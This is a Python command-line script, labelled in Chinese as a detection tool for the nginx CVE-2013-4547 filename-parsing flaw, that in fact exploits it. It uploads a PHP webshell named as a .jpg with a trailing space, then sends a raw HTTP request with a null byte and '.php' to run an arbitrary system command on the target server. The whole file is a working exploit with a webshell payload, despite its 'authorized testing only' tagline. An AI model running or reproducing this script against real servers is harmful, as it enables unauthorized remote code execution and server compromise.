import random
import socket
from urllib.parse import urlparse
import requests
import argparse
import sys
from colorama import Fore, Style


def create_parser():
    """创建并配置参数解析器"""

    parser = argparse.ArgumentParser(
        prog="XingScanner",
        description="CVE-2013-4547漏洞检测工具",
        epilog=f"{Fore.GREEN}Created by Mahua | 仅限授权测试使用{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    # 必选参数组
    required = parser.add_argument_group(f"{Fore.YELLOW}必选参数{Style.RESET_ALL}")
    required.add_argument("-t", "--target",
                          required=True,
                          help=f"目标URL (示例: {Fore.BLUE}http://target.com/upload.php{Style.RESET_ALL})")

    # 可选参数组
    optional = parser.add_argument_group(f"{Fore.CYAN}可选参数{Style.RESET_ALL}")
    optional.add_argument("-c", "--command",
                          default="whoami",
                          help=f"要执行的系统命令 (默认: {Fore.GREEN}%(default)s{Style.RESET_ALL})")
    optional.add_argument("-o", "--output",
                          type=argparse.FileType('w'),
                          help="结果输出文件路径")
    optional.add_argument("-v", "--verbose",
                          action="count",
                          default=0,
                          help="详细模式 (-v 详细信息, -vv 调试输出)")
    optional.add_argument("-h", "--help",
                          action="store_true",
                          help="显示帮助信息")

    return parser


def precheck_arguments(parser):
    """预处理帮助请求和空参数场景"""

    # 显式帮助请求优先
    if any(arg in sys.argv for arg in ('-h', '--help')):
        parser.print_help()
        sys.exit(0)

    # 空参数场景处理
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)


def check_vulnerability(url):
    """检测是否存在 CVE-2013-4547 （nginx文件名逻辑漏洞）"""

    parsed = urlparse(url)
    target_url = f'{parsed.scheme}://{parsed.netloc}/'
    rand_str = ''.join(random.choices('abcdefghijkmnpqrstuvwxyz', k=6))
    webshell_name = f'{rand_str}.jpg\x20'
    print(webshell_name.encode().hex())
    webshell_content = "<?php echo system($_POST['cmd']); ?>"

    files = {
        'file_upload': (webshell_name, webshell_content, 'image/jpeg')
    }

    response = requests.post(target_url, files=files, verify=False)
    if response.status_code == 200:
        print(response.text)
        return webshell_name
    else:
        print(response.status_code)


def send_http_request(host, port, webshell_name, command):
    """使用 socket 发送原始 HTTP POST 请求"""

    raw_request = (
        f"POST /uploadfiles/{webshell_name}\x00.php HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Priority: u=0, i\r\n"
        f"Content-Length: {len(command) + 4}\r\n"
        "\r\n"
        f"cmd={command}"
    )
    print(f'{Fore.BLUE}传输的 TCP 字节流: {Style.RESET_ALL}')
    print(raw_request.encode().hex())

    # 将字符串转换为字节
    request_data = raw_request.encode()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))  # 连接服务器
        s.sendall(request_data)  # 发送 HTTP 请求

        # 接收服务器响应
        response = b""
        chunk = s.recv(4096)  # 以 4KB 为单位读取
        response += chunk

        # 输出 HTTP 响应
        print(f'{Fore.RED}{response.decode(errors="ignore")}')
        print(f"{Fore.GREEN}成功执行命令 '{command}'，使用 '-c' 参数可执行指定命令{Style.RESET_ALL}")


def main():

    parser = create_parser()
    precheck_arguments(parser)
    args = parser.parse_args()
    url = args.target
    host = urlparse(url).hostname
    port = urlparse(url).port
    print(host, port)
    webshell_name = check_vulnerability(url)
    print(webshell_name.encode().hex())
    send_http_request(host, port, webshell_name, args.command)



if __name__ == '__main__':
    main()